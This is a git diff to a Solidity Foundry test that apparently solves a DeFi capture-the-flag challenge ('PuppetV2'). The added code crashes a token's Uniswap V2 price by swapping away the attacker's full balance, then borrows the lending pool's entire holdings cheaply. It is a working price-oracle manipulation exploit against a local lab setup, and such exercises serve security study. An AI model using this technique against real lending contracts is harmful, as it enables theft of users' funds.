@@ -80,12 +80,7 @@ contract PuppetV2 is Test {
         assertGt(uniswapV2Pair.balanceOf(deployer), 0);
 
         // Deploy the lending pool
-        puppetV2Pool = new PuppetV2Pool(
-            address(weth),
-            address(dvt),
-            address(uniswapV2Pair),
-            address(uniswapV2Factory)
-        );
+        puppetV2Pool = new PuppetV2Pool(address(weth), address(dvt), address(uniswapV2Pair), address(uniswapV2Factory));
 
         // Setup initial token balances of pool and attacker account
         dvt.transfer(attacker, ATTACKER_INITIAL_TOKEN_BALANCE);
@@ -99,10 +94,27 @@ contract PuppetV2 is Test {
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
-    function testExploit() public {
+    function testExploitPuppetV2() public {
         /**
          * EXPLOIT START *
          */
+        address[] memory path = new address[](2);
+        path[0] = address(dvt);
+        path[1] = address(weth);
+
+        vm.startPrank(attacker);
+        dvt.approve(address(uniswapV2Router), ATTACKER_INITIAL_TOKEN_BALANCE);
+        uniswapV2Router.swapExactTokensForETH(ATTACKER_INITIAL_TOKEN_BALANCE, 1e18, path, attacker, DEADLINE);
+
+        weth.deposit{value: 29.5 ether}();
+
+        weth.approve(address(puppetV2Pool), 29.5 ether);
+        puppetV2Pool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+        vm.stopPrank();
+
+        uint256 requiredAmount = puppetV2Pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log(" requiredAmount is ", requiredAmount);
+        console.log(attacker.balance);
 
         /**
          * EXPLOIT END *
